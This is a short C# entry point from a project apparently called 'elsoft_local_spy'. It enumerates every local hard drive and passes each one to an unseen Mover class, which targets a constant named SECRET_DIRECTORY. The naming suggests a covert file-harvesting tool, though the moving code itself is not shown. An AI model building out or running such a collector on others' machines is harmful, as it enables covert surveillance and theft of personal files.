using elsoft_local_spy.drivers;
using elsoft_local_spy.movers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace elsoft_local_spy
{
    class Program
    {
        const string SECRET_DIRECTORY = "c://test";
        static void Main(string[] args)
        {
            Console.WriteLine("start");

            Mover mover = new Mover(SECRET_DIRECTORY);

            foreach (DriveInfo d in DriveInfo.GetDrives())
            {
                Driver driver = new Driver(d.Name, d.IsReady, d.DriveType, d.VolumeLabel);
                if (driver.IsHardDrive()) {
                    mover.MoveDirectory(driver.Path, driver.Name);
                }
            }

            Console.WriteLine("end");
        }
    }
}
